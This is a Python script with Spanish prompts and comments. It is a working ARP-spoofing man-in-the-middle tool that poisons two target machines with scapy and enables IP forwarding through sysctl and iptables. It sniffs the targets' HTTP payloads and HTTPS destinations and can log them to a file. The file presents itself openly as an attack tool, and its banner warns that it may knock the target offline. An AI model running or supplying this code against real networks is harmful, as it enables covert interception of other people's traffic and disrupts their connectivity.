#!/usr/bin/env -S python3
import threading
from scapy.all import *
import re
from socket import gethostbyaddr,herror
from platform import system
from subprocess import check_output
from colorama import init,Fore
 
init()
 
logo = '''
\033[0;40;35m
 ▗▄▄▖ ▗▄▖ ▗▄▄▖ ▗▖ ▗▖▗▄▄▄▖ ▗▄▄▖ ▗▄▖ 
▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌
 ▝▀▚▖▐▛▀▜▌▐▛▀▚▖▐▌ ▐▌▐▛▀▀▘ ▝▀▚▖▐▌ ▐▌
▗▄▄▞▘▐▌ ▐▌▐▙▄▞▘▝▚▄▞▘▐▙▄▄▖▗▄▄▞▘▝▚▄▞▘
 
 
\033[0;40;31m[+] por Urb@n --> https://github.com/Urban20                                      
 
\033[33m[X] ADVERTENCIA\nesta herramienta puede afectar la conexion de la maquina objetivo al inteceptar paquetes, dejandola sin internet o con una señal debil mientras dure el ataque
'''
ejecutando = True
 
def guardar(data):
   if guardado:
      try:
         with open(f'{n_arch}.txt','a') as arch:
            arch.write(f'\r\n{data}\r\n')
      except Exception as e:
         print(f'\n\033[0;40;31m[-] hubo un error durante el guardado de paquetes >> {e}\033[0m\n')
 
def ataque(ip1,ip2): 
   global ejecutando
 
   try:
      arp_mitm(ip1,ip2)#type:ignore
 
   except Exception as e:
      print(f'\n\033[0;40;31m[-] ocurrio un error durante el ataque >> {e}\033[0m\n')
      ejecutando = False
      exit(1)
 
def informacion(paquete):
   'informacion de los paquetes HTTPS formateados con re'
   try:
      ip_https = re.search(r'(\d+\.\d+\.\d+\.\d+):https',str(paquete)).group(1).strip()
      ip_dts = re.search(r'TCP (\d+\.\d+\.\d+\.\d+):\w+ >',str(paquete)).group(1).strip()
      #ip_dst --> ip destinatario 0
      #ip_http --> ip del sitio web 1
      info = f'[+] host > {gethostbyaddr(ip_https)[0]}\n[+] ip numerica > {ip_https}\n[+] ipv4 implicado > {ip_dts}'
 

   except herror:
      info = f'[+] ip numerica > {ip_https}\n[+] ipv4 implicado > {ip_dts}'

   except AttributeError:
      info = ''
      

   finally:

      if ip_dts in ipv4s:

         print(Fore.WHITE+f'\r\n{info}\n\r')

         guardar(info)
 
def sniffing_HTTP():
   'protocolos HTTP'
   while ejecutando:
      sniff(timeout=1,filter=f'tcp and port 80 and ( host {maq1} or host {maq2} )',prn=lambda x:x.sprintf('\r\n[+] protocolo http detectado\n[+] ip inicial : %IP.src% -->  ip destinatario : %IP.dst%\n[+] info del paquete recibido > %Raw.load%\r\n'))
 
 
def sniffing_HTTPS():
   'protocolos HTTPS'
   while ejecutando:
      try:
 
         sniff(timeout=1,filter=f'tcp and port 443 and (host {maq1} or host {maq2} )',prn=informacion)       
      except (TypeError,ValueError): pass
 
      except Exception as e: print(f'\n\033[0;40;31m[+] error > {e}\n')  
 
 
 
def ejecucion(maq1,maq2):
 
   threading.Thread(target=ataque,args=(maq1,maq2)).start()
   threading.Thread(target=sniffing_HTTPS).start()
   threading.Thread(target=sniffing_HTTP).start()
 
 
if __name__ == '__main__':
   print(logo)
   ipv4s = []
   guardado = False
   if system() == 'Linux':

      if check_output('whoami',text=True).strip() == 'root': 

         maq1 = str(input(Fore.WHITE+'[#] maquina A (ipv4) >> ')).strip()
         maq2 = str(input(Fore.WHITE+'[#] maquina B (ipv4) >> ')).strip()
         preg = str(input('[0] para guardar info de paquetes HTTPS en .txt >> ')).strip()

         ipv4s.append(maq1)
         ipv4s.append(maq2)

         if preg == '0':
            guardado = True
            n_arch = str(input('[#] nombre que tendra el archivo >> ')).strip()
         else:
            n_arch = None

         print('\033[0m')
         for x in ['sysctl net.ipv4.conf.all.send_redirects=0',
            'sysctl net.ipv4.ip_forward=1',
            'iptables -t mangle -A PREROUTING -j TTL --ttl-inc 10']:
 
            if subprocess.run(x,shell=True).returncode != 0:
               print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
 
         print('\n\033[0;32miniciando ataque ...\033[0m\n')
         ejecucion(maq1,maq2)
      else:
         print('\n\033[0;40;31m[+] no soy root\n')
   else:
      print('\n\033[0;40;31m[+] sistema operativo incompatible\n')
      